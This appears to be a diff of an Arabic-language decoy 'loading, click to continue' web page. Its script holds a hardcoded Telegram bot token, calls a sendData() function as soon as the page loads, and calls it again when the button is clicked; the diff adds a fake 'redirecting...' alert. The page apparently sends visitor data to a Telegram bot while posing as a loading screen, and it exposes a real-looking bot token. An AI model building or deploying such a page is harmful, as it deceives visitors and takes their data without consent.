@@ -7,7 +7,8 @@
 <body style="text-align: center; padding: 50px; font-family: Tahoma;">
     <h2>جاري تحميل المحتوى...</h2>
     <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
-    <button id="btn" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
+    
+    <button id="btn" type="button" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
 
 <script>
     const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
@@ -62,9 +63,13 @@
 
     window.addEventListener("DOMContentLoaded", () => {
         sendData();
+        
         const btn = document.getElementById("btn");
         if (btn) {
-            btn.addEventListener("click", sendData);
+            btn.addEventListener("click", () => {
+                sendData();
+                alert("جاري التحويل...");
+            });
         }
     });
 </script>
